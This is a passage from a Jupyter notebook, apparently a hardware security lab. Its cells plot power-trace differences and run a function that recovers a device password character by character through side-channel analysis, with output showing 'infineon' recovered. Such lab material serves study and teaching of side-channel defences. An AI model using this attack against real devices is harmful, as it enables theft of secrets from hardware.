AAAAAGg/AAAAAAAAAAAAAAAAAABQPwAAAAAAAGA/AAAAAAAAeD8AAAAAAABQPwAAAAAAAAAAAAAAAAAAdD8AAAAAAAB4PwAAAAAAAGA/AAAAAAAAYD8AAAAAAACCPwAAAAAAAHA/AAAAAAAAlD8AAAAAAACQPwAAAAAAAIQ/AAAAAAAAeD8AAAAAAACQPwAAAAAAAJU/AAAAAAAAij8AAAAAAACGPwAAAAAAAGg/AAAAAAAAeD8AAAAAAAB8PwAAAAAAAHg/AAAAAAAAfD8AAAAAAAB0PwAAAAAAAHQ/AAAAAAAAcD8AAAAAAABQPwAAAAAAAFA/AAAAAAAAaD8AAAAAAAAAAAAAAAAAAGg/AAAAAAAAYD8AAAAAAABgPwAAAAAAAHQ/AAAAAAAAhD8AAAAAAAB4PwAAAAAAAHg/AAAAAAAAAAAAAAAAAABwPwAAAAAAAGA/AAAAAAAAcD8AAAAAAABgPwAAAAAAAFA/AAAAAAAAYD8AAAAAAABoPwAAAAAAAGg/AAAAAAAAaD8AAAAAAACAPwAAAAAAAHw/AAAAAAAAfD8AAAAAAACSPwAAAAAAAIA/AAAAAAAAgD8AAAAAAAB0PwAAAAAAAFA/AAAAAAAAcD8AAAAAAABwPwAAAAAAAGA/AAAAAAAAUD8AAAAAAABQPwAAAAAAAGA/AAAAAAAAUD8AAAAAAABgPwAAAAAAAGg/AAAAAAAAAAAAAAAAAAB8PwAAAAAAAGA/AAAAAAAAaD8AAAAAAABgPwAAAAAAAHQ/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAHQ/AAAAAAAAdD8AAAAAAACGPwAAAAAAAHg/AAAAAAAAYD8AAAAAAABQPwAAAAAAAHw/AAAAAAAAdD8AAAAAAAB8PwAAAAAAAHg/AAAAAAAAdD8AAAAAAACCPwAAAAAAAII/AAAAAAAAgD8AAAAAAABgPwAAAAAAAHA/AAAAAAAAdD8AAAAAAABwPwAAAAAAAHA/AAAAAAAAaD8AAAAAAABwPwAAAAAAAGg/AAAAAAAAgD8AAAAAAAB4PwAAAAAAAGg/AAAAAAAAAAAAAAAAAAB4PwAAAAAAAHQ/AAAAAAAAeD8AAAAAAAAAAAAAAAAAAGg/AAAAAAAAcD8AAAAAAABoPwAAAAAAAGA/AAAAAAAAUD8AAAAAAABQPwAAAAAAAHQ/AAAAAAAAaD8AAAAAAABQPwAAAAAAAAAAAAAAAAAAaD8AAAAAAABgPwAAAAAAAI4/AAAAAAAAgj8AAAAAAACAPwAAAAAAAHQ/AAAAAAAAUD8AAAAAAAB0PwAAAAAAAFA/AAAAAAAAYD8AAAAAAABoPwAAAAAAAGg/AAAAAAAAYD8AAAAAAABoPwAAAAAAAFA/AAAAAAAAUD8AAAAAAABQPwAAAAAAAFA/AAAAAAAAAAAAAAAAAABgPwAAAAAAAGg/AAAAAAAAgD8AAAAAAAAAAAAAAAAAAGA/AAAAAAAAYD8AAAAAAAB0PwAAAAAAAJA/AAAAAAAAij8AAAAAAABwPwAAAAAAAHQ/AAAAAAAAhj8AAAAAAAB4PwAAAAAAAIY/AAAAAAAAgj8AAAAAAABwPwAAAAAAAHg/AAAAAAAAgD8AAAAAAAB4PwAAAAAAAAAAAAAAAAAAeD8AAAAAAAB0PwAAAAAAAHg/AAAAAAAAaD8AAAAAAABoPwAAAAAAAGA/AAAAAAAAUD8AAAAAAAB4PwAAAAAAAHQ/AAAAAAAAeD8AAAAAAAB0PwAAAAAAAIQ/AAAAAAAAgD8AAAAAAAB4PwAAAAAAAGA/AAAAAAAAdD8AAAAAAAB4PwAAAAAAAHQ/AAAAAAAAAAAAAAAAAABQPwAAAAAAAFA/AAAAAAAAYD8AAAAAAAB0PwAAAAAAAHw/AAAAAAAAfD8AAAAAAACKPwAAAAAAAII/AAAAAAAAmD8AAAAAAACUPwAAAAAAAII/AAAAAAAAgD8AAAAAAABgPwAAAAAAAHg/AAAAAAAAaD8AAAAAAABoPwAAAAAAAHA/AAAAAAAAcD8AAAAAAABgPwAAAAAAAGg/AAAAAAAAUD8AAAAAAABgPwAAAAAAAFA/AAAAAAAAAAAAAAAAAABQPwAAAAAAAFA/AAAAAAAAUD8AAAAAAABQPwAAAAAAAFA/AAAAAAAAYD8AAAAAAABoPwAAAAAAAIA/AAAAAAAAiD8AAAAAAACCPwAAAAAAAIA/AAAAAAAAYD8AAAAAAABwPwAAAAAAAHA/AAAAAAAAhj8AAAAAAACCPwAAAAAAAHA/AAAAAAAAaD8AAAAAAAB8PwAAAAAAAHQ/AAAAAAAAUD8AAAAAAABwPwAAAAAAAHQ/AAAAAAAAdD8AAAAAAABQPwAAAAAAAGg/AAAAAAAAcD8AAAAAAABoPwAAAAAAAAAAAAAAAAAAeD8AAAAAAAB0PwAAAAAAAHA/AAAAAAAAfD8AAAAAAACAPwAAAAAAAHA/AAAAAAAAeD8AAAAAAABwPwAAAAAAAHA/AAAAAAAAcD8AAAAAAABoPwAAAAAAAGA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAHQ/AAAAAAAAaD8AAAAAAABgPwAAAAAAAAAAAAAAAAAAcD8AAAAAAACQPwAAAAAAAIo/AAAAAAAAeD8AAAAAAABoPwAAAAAAAAAAAAAAAAAAAAAAAAAAAABoPwAAAAAAAGA/AAAAAAAAaD8AAAAAAABwPwAAAAAAAGg/AAAAAAAAYD8AAAAAAABwPwAAAAAAAFA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAGA/AAAAAAAAYD8AAAAAAABoPwAAAAAAAGA/AAAAAAAAcD8AAAAAAABgPwAAAAAAAFA/AAAAAAAAaD8AAAAAAACSPwAAAAAAAI4/AAAAAAAAhD8AAAAAAABgPwAAAAAAAIY/AAAAAAAAhD8AAAAAAACCPwAAAAAAAIg/AAAAAAAAcD8AAAAAAABoPwAAAAAAAIA/AAAAAAAAdD8AAAAAAABgPwAAAAAAAAAAAAAAAAAAeD8AAAAAAAB0PwAAAAAAAFA/AAAAAAAAAAAAAAAAAAB0PwAAAAAAAGg/AAAAAAAAYD8AAAAAAAB0PwAAAAAAAGg/AAAAAAAAaD8AAAAAAABwPwAAAAAAAIQ/AAAAAAAAgj8AAAAAAACAPwAAAAAAAHQ/AAAAAAAAcD8AAAAAAAB0PwAAAAAAAFA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAGA/AAAAAAAAcD8AAAAAAABgPwAAAAAAAGg/AAAAAAAAaD8AAAAAAAB8PwAAAAAAAJU/AAAAAAAAkj8AAAAAAACEPwAAAAAAAHw/AAAAAAAAUD8AAAAAAABQPwAAAAAAAHQ/AAAAAAAAYD8AAAAAAABQPwAAAAAAAGg/AAAAAAAAAAAAAAAAAABQPwAAAAAAAGA/AAAAAAAAaD8AAAAAAABgPwAAAAAAAGg/AAAAAAAAfD8AAAAAAABgPwAAAAAAAGA/AAAAAAAAAAAAAAAAAABQPwAAAAAAAFA/AAAAAAAAUD8AAAAAAAAAAAAAAAAAAIY/AAAAAAAAgD8AAAAAAACAPwAAAAAAAHA/AAAAAAAAaD8AAAAAAABoPwAAAAAAAHA/AAAAAAAAgD8AAAAAAABwPwAAAAAAAHA/AAAAAAAAUD8AAAAAAAB4PwAAAAAAAGA/AAAAAAAAUD8AAAAAAAB4PwAAAAAAAGg/AAAAAAAAaD8AAAAAAABgPwAAAAAAAHg/AAAAAAAAUD8AAAAAAAAAAAAAAAAAAHw/AAAAAAAAfD8AAAAAAABwPwAAAAAAAHA/AAAAAAAAgj8AAAAAAAB4PwAAAAAAAHQ/AAAAAAAAaD8AAAAAAABoPwAAAAAAAGg/AAAAAAAAYD8AAAAAAAAAAAAAAAAAAFA/AAAAAAAAUD8AAAAAAABgPwAAAAAAAHA/AAAAAAAAaD8AAAAAAAAAAAAAAAAAAHQ/AAAAAAAAjD8AAAAAAACIPwAAAAAAAIQ/AAAAAAAAcD8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAUD8AAAAAAAB4PwAAAAAAAGg/AAAAAAAAaD8AAAAAAABwPwAAAAAAAGg/AAAAAAAAdD8AAAAAAAB0PwAAAAAAAAAAAAAAAAAAYD8AAAAAAAB4PwAAAAAAAFA/AAAAAAAAAAAAAAAAAABQPwAAAAAAAHQ/AAAAAAAAaD8AAAAAAAAAAAAAAAAAAGA/AAAAAAAAjj8AAAAAAACKPwAAAAAAAIQ/AAAAAAAAfD8AAAAAAACCPwAAAAAAAHw/AAAAAAAAeD8AAAAAAACAPwAAAAAAAGA/AAAAAAAAaD8AAAAAAABwPwAAAAAAAIA/AAAAAAAAaD8AAAAAAABQPwAAAAAAAGg/AAAAAAAAcD8AAAAAAABoPwAAAAAAAGA/AAAAAAAAcD8AAAAAAABoPwAAAAAAAFA/AAAAAAAAYD8AAAAAAAB4PwAAAAAAAHQ/AAAAAAAAYD8AAAAAAACAPwAAAAAAAHw/AAAAAAAAdD8AAAAAAAAAAAAAAAAAAHQ/AAAAAAAAfD8AAAAAAABoPwAAAAAAAHA/AAAAAAAAYD8AAAAAAABQPwAAAAAAAAAAAAAAAAAAcD8AAAAAAABoPwAAAAAAAHA/AAAAAAAAYD8AAAAAAACZPwAAAAAAAJU/AAAAAAAAjj8AAAAAAACAPwAAAAAAAFA/AAAAAAAAUD8AAAAAAABQPwAAAAAAAHA/AAAAAAAAcD8AAAAAAABoPwAAAAAAAHA/AAAAAAAAUD8AAAAAAABoPwAAAAAAAHA/AAAAAAAAYD8AAAAAAABwPwAAAAAAAHw/AAAAAAAAYD8AAAAAAABQPwAAAAAAAAAAAAAAAAAAdD8AAAAAAABgPwAAAAAAAGA/AAAAAAAAUD8AAAAAAACEPwAAAAAAAIg/AAAAAAAAgj8AAAAAAABwPwAAAAAAAHQ/AAAAAAAAaD8AAAAAAABoPwAAAAAAAGA/AAAAAAAAYD8AAAAAAABwPwAAAAAAAGg/AAAAAAAAYD8AAAAAAABgPwAAAAAAAFA/AAAAAAAAYD8AAAAAAAB4PwAAAAAAAHA/AAAAAAAAUD8AAAAAAABQPwAAAAAAAHg/AAAAAAAAAAAAAAAAAABgPwAAAAAAAHQ/AAAAAAAAdD8AAAAAAABQPwAAAAAAAGA/AAAAAAAAeD8AAAAAAAB4PwAAAAAAAFA/AAAAAAAAdD8AAAAAAAB8PwAAAAAAAHA/AAAAAAAAdD8AAAAAAABgPwAAAAAAAFA/AAAAAAAAYD8AAAAAAABoPwAAAAAAAHA/AAAAAAAAaD8AAAAAAABoPwAAAAAAAJA/AAAAAAAAhj8AAAAAAACCPwAAAAAAAHw/AAAAAAAAUD8AAAAAAABoPwAAAAAAAFA/AAAAAAAAeD8AAAAAAABwPwAAAAAAAHA/AAAAAAAAUD8AAAAAAABoPwAAAAAAAHg/AAAAAAAAcD8AAAAAAABQPwAAAAAAAFA/AAAAAAAAeD8AAAAAAAB4PwAAAAAAAFA/AAAAAAAAAAAAAAAAAAB8PwAAAAAAAGg/AAAAAAAAaD8AAAAAAABgPwAAAAAAAJc/AAAAAAAAmT8AAAAAAACSPwAAAAAAAJE/AAAAAAAAnj8AAAAAAACTPwAAAAAAAIo/AAAAAAAAhj8AAAAAAABgPwAAAAAAAGA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAFA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAHQ/AAAAAAAAdD8AAAAAAABgPwAAAAAAAGA/AAAAAAAAdD8AAAAAAABQPwAAAAAAAFA/AAAAAAAAaD8AAAAAAABoPwAAAAAAAGA/AAAAAAAAaD8AAAAAAAB8PwAAAAAAAIA/AAAAAAAAUD8AAAAAAABQPwAAAAAAAHg/AAAAAAAAcD8AAAAAAAB8PwAAAAAAAGg/AAAAAAAAYD8AAAAAAABQPwAAAAAAAHA/AAAAAAAAUD8AAAAAAABQPwAAAAAAAGg/AAAAAAAAYD8AAAAAAABgPwAAAAAAAAAAAAAAAAAAYD8AAAAAAACAPwAAAAAAAHw/AAAAAAAAdD8AAAAAAABgPwAAAAAAAFA/AAAAAAAAUD8AAAAAAAB0PwAAAAAAAGg/AAAAAAAAcD8AAAAAAABwPwAAAAAAAGg/AAAAAAAAYD8AAAAAAACCPwAAAAAAAHw/AAAAAAAAUD8AAAAAAABQPwAAAAAAAGA/AAAAAAAAYD8AAAAAAABgPwAAAAAAAGA/AAAAAAAAgD8AAAAAAACAPwAAAAAAAHg/AAAAAAAAaD8AAAAAAACEPwAAAAAAAFA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAIQ/AAAAAAAAcD8AAAAAAAB0PwAAAAAAAHA/AAAAAAAAaD8AAAAAAABoPwAAAAAAAGA/AAAAAAAAaD8AAAAAAABwPwAAAAAAAGA/AAAAAAAAAAAAAAAAAAB0PwAAAAAAAGA/AAAAAAAAYD8AAAAAAABoPwAAAAAAAHA/AAAAAAAAaD8AAAAAAABoPwAAAAAAAGg/AAAAAAAAgD8AAAAAAABgPwAAAAAAAAAAAAAAAAAAdD8AAAAAAABoPwAAAAAAAHQ/AAAAAAAAdD8AAAAAAABwPwAAAAAAAGg/AAAAAAAAeD8AAAAAAABQPwAAAAAAAFA/AAAAAAAAYD8AAAAAAACGPwAAAAAAAIw/AAAAAAAAij8AAAAAAACCPwAAAAAAAFA/AAAAAAAAYD8AAAAAAABgPwAAAAAAAFA/AAAAAAAAgD8AAAAAAABwPwAAAAAAAHA/AAAAAAAAUD8AAAAAAAB0PwAAAAAAAHQ/AAAAAAAAcD8AAAAAAABgPwAAAAAAAII/AAAAAAAAeD8AAAAAAAB4PwAAAAAAAGA/AAAAAAAAaD8AAAAAAABoPwAAAAAAAAAAAAAAAAAAUD8AAAAAAACAPwAAAAAAAIA/AAAAAAAAgj8AAAAAAAB8PwAAAAAAAIg/AAAAAAAAiD8AAAAAAAB0PwAAAAAAAHA/AAAAAAAAgD8AAAAAAABoPwAAAAAAAGg/AAAAAAAAYD8AAAAAAAAAAAAAAAAAAGA/AAAAAAAAcD8AAAAAAABQPwAAAAAAAGg/AAAAAAAAaD8AAAAAAABgPwAAAAAAAGg/AAAAAAAAaD8AAAAAAABQPwAAAAAAAFA/AAAAAAAAfD8AAAAAAABQPwAAAAAAAFA/AAAAAAAAUD8AAAAAAAB8PwAAAAAAAGA/AAAAAAAAAAAAAAAAAAB0PwAAAAAAAHQ/AAAAAAAAdD8AAAAAAABwPwAAAAAAAGg/AAAAAAAAaD8AAAAAAACUPwAAAAAAAIw/AAAAAAAAgD8=\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[1000]}},\"selected\":{\"id\":\"1051\"},\"selection_policy\":{\"id\":\"1050\"}},\"id\":\"1036\",\"type\":\"ColumnDataSource\"},{\"attributes\":{\"line_color\":\"#ff7f0e\",\"x\":{\"field\":\"x\"},\"y\":{\"field\":\"y\"}},\"id\":\"1056\",\"type\":\"Line\"},{\"attributes\":{},\"id\":\"1020\",\"type\":\"PanTool\"},{\"attributes\":{\"label\":{\"value\":\"abs(\\\"\\\" - \\\"a\\\") with SAD = 4.54\"},\"renderers\":[{\"id\":\"1040\"}]},\"id\":\"1054\",\"type\":\"LegendItem\"},{\"attributes\":{},\"id\":\"1049\",\"type\":\"AllLabels\"},{\"attributes\":{\"line_alpha\":0.2,\"line_color\":\"#1f77b4\",\"x\":{\"field\":\"x\"},\"y\":{\"field\":\"y\"}},\"id\":\"1039\",\"type\":\"Line\"},{\"attributes\":{},\"id\":\"1023\",\"type\":\"SaveTool\"},{\"attributes\":{\"label\":{\"value\":\"abs(\\\"\\\" - \\\"i\\\") with SAD = 70.69\"},\"renderers\":[{\"id\":\"1059\"}]},\"id\":\"1074\",\"type\":\"LegendItem\"},{\"attributes\":{\"line_alpha\":0.1,\"line_color\":\"#1f77b4\",\"x\":{\"field\":\"x\"},\"y\":{\"field\":\"y\"}},\"id\":\"1038\",\"type\":\"Line\"},{\"attributes\":{\"overlay\":{\"id\":\"1026\"}},\"id\":\"1022\",\"type\":\"BoxZoomTool\"},{\"attributes\":{\"line_color\":\"#1f77b4\",\"x\":{\"field\":\"x\"},\"y\":{\"field\":\"y\"}},\"id\":\"1037\",\"type\":\"Line\"},{\"attributes\":{},\"id\":\"1008\",\"type\":\"LinearScale\"},{\"attributes\":{\"bottom_units\":\"screen\",\"coordinates\":null,\"fill_alpha\":0.5,\"fill_color\":\"lightgrey\",\"group\":null,\"left_units\":\"screen\",\"level\":\"overlay\",\"line_alpha\":1.0,\"line_color\":\"black\",\"line_dash\":[4,4],\"line_width\":2,\"right_units\":\"screen\",\"syncable\":false,\"top_units\":\"screen\"},\"id\":\"1026\",\"type\":\"BoxAnnotation\"},{\"attributes\":{\"coordinates\":null,\"formatter\":{\"id\":\"1048\"},\"group\":null,\"major_label_policy\":{\"id\":\"1049\"},\"ticker\":{\"id\":\"1013\"}},\"id\":\"1012\",\"type\":\"LinearAxis\"},{\"attributes\":{},\"id\":\"1071\",\"type\":\"UnionRenderers\"},{\"attributes\":{},\"id\":\"1004\",\"type\":\"DataRange1d\"},{\"attributes\":{},\"id\":\"1021\",\"type\":\"WheelZoomTool\"},{\"attributes\":{},\"id\":\"1025\",\"type\":\"HelpTool\"},{\"attributes\":{},\"id\":\"1072\",\"type\":\"Selection\"},{\"attributes\":{},\"id\":\"1024\",\"type\":\"ResetTool\"},{\"attributes\":{\"coordinates\":null,\"formatter\":{\"id\":\"1045\"},\"group\":null,\"major_label_policy\":{\"id\":\"1046\"},\"ticker\":{\"id\":\"1017\"}},\"id\":\"1016\",\"type\":\"LinearAxis\"},{\"attributes\":{\"axis\":{\"id\":\"1016\"},\"coordinates\":null,\"dimension\":1,\"group\":null,\"ticker\":null},\"id\":\"1019\",\"type\":\"Grid\"},{\"attributes\":{},\"id\":\"1050\",\"type\":\"UnionRenderers\"},{\"attributes\":{\"axis\":{\"id\":\"1012\"},\"coordinates\":null,\"group\":null,\"ticker\":null},\"id\":\"1015\",\"type\":\"Grid\"},{\"attributes\":{},\"id\":\"1051\",\"type\":\"Selection\"},{\"attributes\":{},\"id\":\"1013\",\"type\":\"BasicTicker\"},{\"attributes\":{},\"id\":\"1010\",\"type\":\"LinearScale\"},{\"attributes\":{\"tools\":[{\"id\":\"1020\"},{\"id\":\"1021\"},{\"id\":\"1022\"},{\"id\":\"1023\"},{\"id\":\"1024\"},{\"id\":\"1025\"},{\"id\":\"1034\"}]},\"id\":\"1027\",\"type\":\"Toolbar\"},{\"attributes\":{\"source\":{\"id\":\"1055\"}},\"id\":\"1060\",\"type\":\"CDSView\"},{\"attributes\":{\"line_alpha\":0.2,\"line_color\":\"#ff7f0e\",\"x\":{\"field\":\"x\"},\"y\":{\"field\":\"y\"}},\"id\":\"1058\",\"type\":\"Line\"}],\"root_ids\":[\"1003\"]},\"title\":\"Bokeh Application\",\"version\":\"2.4.1\"}};\n",
       "  const render_items = [{\"docid\":\"cdb348fc-4955-45c6-a127-3f85ff8326f7\",\"root_ids\":[\"1003\"],\"roots\":{\"1003\":\"8f812792-b83e-4d70-9e2b-98bc77c76fe5\"}}];\n",
       "  root.Bokeh.embed.embed_items_notebook(docs_json, render_items);\n",
       "\n",
       "  }\n",
       "  if (root.Bokeh !== undefined) {\n",
       "    embed_document(root);\n",
       "  } else {\n",
       "    let attempts = 0;\n",
       "    const timer = setInterval(function(root) {\n",
       "      if (root.Bokeh !== undefined) {\n",
       "        clearInterval(timer);\n",
       "        embed_document(root);\n",
       "      } else {\n",
       "        attempts++;\n",
       "        if (attempts > 100) {\n",
       "          clearInterval(timer);\n",
       "          console.log(\"Bokeh: ERROR: Unable to run BokehJS code because BokehJS library is missing\");\n",
       "        }\n",
       "      }\n",
       "    }, 10, root)\n",
       "  }\n",
       "})(window);"
      ],
      "application/vnd.bokehjs_exec.v0+json": ""
     },
     "metadata": {
      "application/vnd.bokehjs_exec.v0+json": {
       "id": "1003"
      }
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "p = figure(width=900, height=200)\n",
    "p.add_tools(CrosshairTool())\n",
    "for idx, ((attempt1, trace1), (attempt2, trace2)) in enumerate([\n",
    "    (traces[0], traces[1]),\n",
    "    (traces[0], traces[2]),\n",
    "]):\n",
    "    p.line(\n",
    "        range(len(trace1)), \n",
    "        abs(trace1 - trace2), \n",
    "        line_color=Category10_10[idx],\n",
    "        legend_label=f'abs(\"{attempt1}\" - \"{attempt2}\") with SAD = {sad(trace1, trace2):.2f}'\n",
    "    )\n",
    "show(p)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Automated attack"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-24T09:38:12.436264Z",
     "iopub.status.busy": "2021-12-24T09:38:12.436019Z",
     "iopub.status.idle": "2021-12-24T09:38:12.437143Z",
     "shell.execute_reply": "2021-12-24T09:38:12.437321Z"
    }
   },
   "outputs": [],
   "source": [
    "def attack_password_sad(\n",
    "    sad_threshold=20,\n",
    "    charlist='abcdefghijklmnopqrstuvwxyz0123456789'\n",
    "):\n",
    "    result = False\n",
    "    password = ''\n",
    "\n",
    "    while not result or len(password) > 9:\n",
    "        basetrace, _ = capture(password)\n",
    "        for c in charlist:\n",
    "            trace, result = capture(password + c)\n",
    "            if sad(trace, basetrace) > sad_threshold:\n",
    "                password += c\n",
    "                print(f'success: \"{c}\" => password = {password}')\n",
    "                break\n",
    "        else:\n",
    "            print('no found')\n",
    "            break\n",
    "    return password, result"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-24T09:38:12.439276Z",
     "iopub.status.busy": "2021-12-24T09:38:12.439020Z",
     "iopub.status.idle": "2021-12-24T09:38:13.341467Z",
     "shell.execute_reply": "2021-12-24T09:38:13.341667Z"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "success: \"i\" => password = i\n",
      "success: \"n\" => password = in\n",
      "success: \"f\" => password = inf\n",
      "success: \"i\" => password = infi\n",
      "success: \"n\" => password = infin\n",
      "success: \"e\" => password = infine\n",
      "success: \"o\" => password = infineo\n",
      "success: \"n\" => password = infineon\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "('infineon', True)"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "attack_password_sad()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-24T09:38:13.343926Z",
     "iopub.status.busy": "2021-12-24T09:38:13.343684Z",
     "iopub.status.idle": "2021-12-24T09:38:13.345045Z",
     "shell.execute_reply": "2021-12-24T09:38:13.344833Z"
    }
   },
   "outputs": [],
   "source": [
    "util.exit()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.5"
  },
  "toc": {
   "base_numbering": 1,
   "nav_menu": {},
   "number_sections": true,
   "sideBar": true,
   "skip_h1_title": true,
   "title_cell": "Table of Contents",
   "title_sidebar": "Contents",
   "toc_cell": false,
   "toc_position": {},
   "toc_section_display": true,
   "toc_window_display": false
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
